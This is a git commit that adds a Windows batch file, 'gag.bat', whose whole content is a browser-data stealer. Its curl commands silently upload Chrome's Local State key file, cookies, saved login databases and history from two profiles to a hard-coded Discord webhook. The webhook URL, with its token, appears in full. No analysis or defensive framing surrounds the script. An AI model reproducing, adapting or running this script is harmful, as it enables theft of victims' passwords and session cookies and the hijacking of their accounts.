6d90be958ab82a7fc1da7a55b523ea51ed603b4e
cybercookie123 <70143523+cybercookie123@users.noreply.github.com>
2023-08-15 15:38:20 +0200

    Add files via upload

---
+++ gag.bat
@@ -0,0 +1,34 @@
+@echo off
+
+
+
+curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```get jinx grabbed```\"}" https://discord.com/api/webhooks/1136998740037738640/lmhV2uypII_zCLi0ofnyLRH5mtlrz4Z31FjeZ-VBU357QeJoEzgz5o6xNuVhoVF63SEX
+
+
+
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Local State" https://discord.com/api/webhooks/1136998740037738640/lmhV2uypII_zCLi0ofnyLRH5mtlrz4Z31FjeZ-VBU357QeJoEzgz5o6xNuVhoVF63SEX
+
+curl --silent --output /dev/null -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" https://discord.com/api/webhooks/1136998740037738640/lmhV2uypII_zCLi0ofnyLRH5mtlrz4Z31FjeZ-VBU357QeJoEzgz5o6xNuVhoVF63SEX
+
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" https://discord.com/api/webhooks/1136998740037738640/lmhV2uypII_zCLi0ofnyLRH5mtlrz4Z31FjeZ-VBU357QeJoEzgz5o6xNuVhoVF63SEX 
+
+
+curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Profile 1 data```\"}" https://discord.com/api/webhooks/1136998740037738640/lmhV2uypII_zCLi0ofnyLRH5mtlrz4Z31FjeZ-VBU357QeJoEzgz5o6xNuVhoVF63SEX
+
+
+
+
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 1\Login Data" https://discord.com/api/webhooks/1136998740037738640/lmhV2uypII_zCLi0ofnyLRH5mtlrz4Z31FjeZ-VBU357QeJoEzgz5o6xNuVhoVF63SEX 
+
+
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 1\History" https://discord.com/api/webhooks/1136998740037738640/lmhV2uypII_zCLi0ofnyLRH5mtlrz4Z31FjeZ-VBU357QeJoEzgz5o6xNuVhoVF63SEX
+
+curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Profile 1\Login Data For Account" https://discord.com/api/webhooks/1136998740037738640/lmhV2uypII_zCLi0ofnyLRH5mtlrz4Z31FjeZ-VBU357QeJoEzgz5o6xNuVhoVF63SEX  
+
+
+
+
+
+
+
+
